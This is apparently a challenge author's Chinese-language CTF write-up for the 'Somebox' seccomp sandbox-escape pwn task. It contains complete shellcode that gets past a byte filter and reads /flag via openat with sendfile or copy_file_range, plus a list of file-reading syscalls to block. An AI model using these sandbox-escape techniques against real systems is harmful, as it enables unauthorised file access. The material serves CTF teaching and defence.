# Somebox Pwn部分分析

## 题目设计

本题是一道pwn与crypto结合的沙箱逃逸类型题目，题目使用rust编写，主要逻辑如下：

1. 使用流密码加密所有的输入输出
2. 解密（已给出源码）被加密的`/config/config.enc`，提取沙箱的配置文件`/tmp/box_conifg`
3. 侧信道攻击登录密码获取`Admin`权限
4. 进入`shellcode`功能执行
5. 打印沙箱配置文件

由于比赛是联网环境，考虑到目前ai的逆向分析能力，编译的时候去除了符号表，根据最后实际情况来看，`GPT-5.1-codex`和`Gemini 3 pro`已经能做到无需手动调试自动实现对于流密码的明文攻击部分、侧信道攻击部分、配置文件加密解密部分，因此本文不再赘述这一部分，主要对于本题的pwn部分进行分析。

## 检测函数

在执行前，`check` 函数会对 Shellcode 的每 3 个连续字节 (`b1`, `b2`, `b3`) 进行一次模拟游戏测试。

- **游戏设定**:

  - **玩家 (Players)**: 3 个单位，生命值 $HP = 255 + ByteValue$，攻击力 5。
  - **Boss**: 生命值 $HP = \sum PlayerHP$，攻击力 5。

- **战斗逻辑**:

  - 这是一个回合制战斗，随机选一个活着的玩家互殴（Boss 扣 5 血，玩家扣 5 血）。
  - **失败条件**: 所有玩家死亡 (`is_alive = false`) **且** Boss 仍存活。
  - **惩罚**: 如果 `game` 返回 `false`，Shellcode 会被随机 XOR 破坏。

- 数学分析 (漏洞):

  这是一个不可能胜利的游戏。

  - 初始状态：`BossHP` = `Player1` + `Player2` + `Player3`。

  - 每一回合有效攻击：

    - 选中的 Player 扣 5 血。
    - Boss 扣 5 血
    - 检查双方剩余血量，如果小于5就算死亡

  - 不变性分析:

    不妨设三个人的血量为5x+a，5y+b，5z+c，boss的血量为5(x+y+z) + (a+b+c)，abc均小于等于5

    假设满足失败条件：三人全死，boss存活，那么需要战斗(x+y+z)回合，此时boss的血量为(a+b+c)，此时boss需要存活，意味着(a+b+c)>=5，因此输掉游戏的本质就是a+b+c<4
  
    即：
  
    > `Player1 mod 5` + `Player2 mod 5` + `Player3 mod 5` < 5 
  

## 编写shellcode

1. **内存映射**: Shellcode 被拷贝到 `mmap` 分配的内存中。
2. **子进程 Fork**: 主进程 fork 出子进程执行代码。
3. **Seccomp 过滤 (`sandbox` 函数)**:
   - `stdin` 被关闭 (`close(0)`).
   - **禁止**: `execve`, `execveat`, `mprotect`。
   - **动态禁止**: 从 `/tmp/box_config` 读取配置，禁止额外的 syscall（默认是`open`，`read`，`open`）。
   - **允许**: `openat` 。
4. **寄存器清空**: 在跳转到 Shellcode 前，除了 `rax` (跳转地址)，其他通用寄存器都被清零。

对于初始沙箱，考虑使用`openat`+`sendfile`获取flag，本题的难点是找到一个可写的地址来写入字符串

首先考虑从寄存器恢复，很明显可以发现没有清空浮点数寄存器和`fs`寄存器，这里选择`fs`寄存器

> xchg rsp,fs:[rbx]

同时寻找一个无用的寄存器作为填充字节：

> fs

如何将字符串写入内存呢，考虑在寄存器中写入`flag`字符串后`push`到rsp，使用这个函数设置：

```python
def set_bit(num):
    sc = asm(f"""
            fs
            fs
            push {num}
            fs
            fs
            pop rbx
            fs
            fs
            shl ecx, 1
            fs
            shl ecx, 1
            fs
            shl ecx, 1
            fs
            shl ecx, 1
            fs
            shl ecx, 1
            fs
            shl ecx, 1
            fs
            shl ecx, 1
            fs
            shl ecx, 1
            fs
            add cl, bl
            """)
    return sc

shell = asm("""
        movq rsp, xmm0
        """)
shell += set_bit(0x67)  # g
shell += set_bit(0x61)  # a
shell += set_bit(0x6c)  # l
shell += set_bit(0x66)  # f
shell += asm("""
        push rcx
        fs
        fs
        push rsp
        fs
        fs
        pop rsi
        fs
        fs
        """)
```

后续对于其他寄存器的控制由于都不超过2byte，都可以使用`eax`和`push`、`pop`来控制

完整的shellcode：

```python
def set_bit(num):
    sc = asm(f"""
            fs
            fs
            push {num}
            fs
            fs
            pop rbx
            fs
            fs
            shl ecx, 1
            fs
            shl ecx, 1
            fs
            shl ecx, 1
            fs
            shl ecx, 1
            fs
            shl ecx, 1
            fs
            shl ecx, 1
            fs
            shl ecx, 1
            fs
            shl ecx, 1
            fs
            add cl, bl
            """)
    return sc

shell = asm("""
        movq rsp, xmm0
        """)
shell += set_bit(0x67)  # g
shell += set_bit(0x61)  # a
shell += set_bit(0x6c)  # l
shell += set_bit(0x66)  # f
shell += asm("""
        push rcx
        fs
        fs
        push rsp
        fs
        fs
        pop rsi
        fs
        fs
        push rdx
        fs
        fs
        pop rcx
        fs
        fs
        """)
shell += set_bit(0x1)  # 01
shell += set_bit(0x1)  # 01
shell += asm("""
        xchg eax, ecx
        push rdx
        fs
        fs
        pop rbx
        fs
        fs
        sub rbx, 100
        push rbx
        pop rdi
        syscall
        """)
shell += asm("""
        push rax
        fs
        fs
        pop rsi
        fs
        fs
        push 1
        pop rdi
        push rax
        pop rdx
        push 0xff
        pop r10
        push 40
        pop rax
        syscall
        """)
```

## patch设计

从题目角度出发，泄漏`flag`需要满足打开读取并输出，由于已经给了`openat`白名单，同时由于输出可以用侧信道，此题的瓶颈就在读取文件上面，因此这个题的patch思路就是如果禁用读取相关的系统调用，下面是我能想到的读文件的10个系统调用：

> mmap
>
> read
>
> readv
>
> pread64
>
> preadv
>
> preadv2
>
> splice + pipe
>
> sendfie
>
> io_uring
>
> io_setup

为何这个题给了十个系统调用可以被ban掉呢，是因为还有一个系统调用结合题目本身的设计可以实现输出：

由于题目提供了一个接口读取文件`/tmp/box_config`，因此只要将`flag`的内容写入`/tmp/box_config`，而这就不得不提到一个新的系统调用：`copy_file_range`

由于此时的文件名已经不能简单使用`eax`寄存器实现了，现给出一个新的可以直接写入内存的函数：

```python
def push_bit(num):
    sc = asm(f"""
            push {num}
            fs
            fs
            add rsp, 10
            fs
            fs
            sub rsp, 1 
            fs
            fs
            """)
    return sc

def push_bit_4(num):
    sc = asm(f"""
            push {num-1}
            fs
            fs
            pop rax
            fs
            fs
            inc rax
            push rax
            add rsp, 10
            fs
            fs
            sub rsp, 1 
            fs
            fs
            """)
    return sc

def set_str(string):
    sc = asm("""
            fs
            fs
            """)
    for c in string:
        if ord(c) % 5 == 4:
            sc += push_bit_4(ord(c))
        else: 
            sc += push_bit(ord(c))
    sc += push_bit(0)
    return sc
```

新的完整的shellcode：

```python
def set_bit(num):
    sc = asm(f"""
            fs
            fs
            push {num}
            fs
            fs
            pop rbx
            fs
            fs
            shl ecx, 1
            fs
            shl ecx, 1
            fs
            shl ecx, 1
            fs
            shl ecx, 1
            fs
            shl ecx, 1
            fs
            shl ecx, 1
            fs
            shl ecx, 1
            fs
            shl ecx, 1
            fs
            add cl, bl
            """)
    return sc
# movq xmm4, xmm1

def push_bit(num):
    sc = asm(f"""
            push {num}
            fs
            fs
            add rsp, 10
            fs
            fs
            sub rsp, 1 
            fs
            fs
            """)
    return sc

def push_bit_4(num):
    sc = asm(f"""
            push {num-1}
            fs
            fs
            pop rax
            fs
            fs
            inc rax
            push rax
            add rsp, 10
            fs
            fs
            sub rsp, 1 
            fs
            fs
            """)
    return sc

def set_str(string):
    sc = asm("""
            fs
            fs
            """)
    for c in string:
        if ord(c) % 5 == 4:
            sc += push_bit_4(ord(c))
        else: 
            sc += push_bit(ord(c))
    sc += push_bit(0)
    return sc

def set_rax_syscall(num):
    shell = asm("""
            push 0
            fs
            pop rcx
            fs
            fs
            """)
    num = p16(num)[::-1]
    for b in num:
        shell += set_bit(b)
    shell += asm("""
            xchg eax, ecx
            syscall
            """)
    return shell

# openat(-100, "flag", 0, 0)
shell = asm("""
        movq rsp, xmm0
        fs
        fs
        push rsp
        fs
        fs
        pop rsi
        fs
        fs
        push 8
        fs
        fs
        pop rcx
        fs
        fs
        sub rsi, rcx
        """)
shell += set_str("/flag")
shell += asm("""
        push rdx
        fs
        fs
        pop rbx
        fs
        fs
        sub rbx, 100
        push rbx
        pop rdi
        """)
shell += set_rax_syscall(257)
# openat(0, "/tmp/box_config", 0)
shell += asm("""
        movq rsp, xmm0
        fs
        fs
        push rsp
        fs
        fs
        pop rsi
        fs
        fs
        push 8
        fs
        fs
        pop rcx
        fs
        fs
        sub rsi, rcx
        """)
shell += set_str("/tmp/box_config")
shell += asm("""
        push 1
        pop rdx
        """)
shell += set_rax_syscall(257)
shell += asm("""
            push 0
            pop rdi
            push 0
            mov rsi, rsp
            push rsi
            pop r10
            push 3
            pop rdx
            push 0
            pop r9
            fs
            fs
            push 0xff
            pop r8
            """)
shell += set_rax_syscall(326)
```

## 对抗性

本题设计的初衷就是一个根本无法完全修复的沙箱，因此选手需要尽可能多的实现不同的方法来实现读取`/flag`，根据远程读取到的沙箱信息拼接`shellcode`实现自动化攻击，同时需要根据策略每轮自动`patch`自己的沙箱规则，避免被用一个`exp`被连续多轮攻击，但是由于前面的密码部分逆向量过于大导致选手没有太多的时间实现这个对抗的流程没有达到很好的效果。
